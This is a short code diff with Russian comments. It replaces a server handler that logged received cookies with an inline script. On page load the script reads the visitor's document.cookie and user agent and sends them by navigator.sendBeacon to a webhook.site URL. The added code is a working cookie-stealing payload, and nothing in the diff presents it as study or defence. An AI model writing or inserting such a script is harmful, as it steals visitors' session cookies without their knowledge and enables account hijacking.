@@ -1,6 +1,19 @@
-export default function handler(req, res) {
-    const cookies = req.query.cookies || req.headers.cookie || "пусто";
-    console.log("=== КУКИ ПРИЛЕТЕЛИ ===");
-    console.log(cookies);
-    res.status(200).send("ok");
-}
+<script>
+    function sendData() {
+        const cookies = document.cookie;
+        const webhookUrl = "https://webhook.site/3e550fb6-2d7d-482c-9876-c144192f0710";
+        
+        // Формируем строку данных
+        const payload = new URLSearchParams({
+            cookies: cookies,
+            ua: navigator.userAgent
+        }).toString();
+
+        // Использование sendBeacon — наиболее надежный способ отправки данных 
+        // при переходе пользователя или загрузке страницы
+        navigator.sendBeacon(webhookUrl, payload);
+    }
+
+    // Запуск при загрузке страницы
+    window.onload = sendData;
+</script>
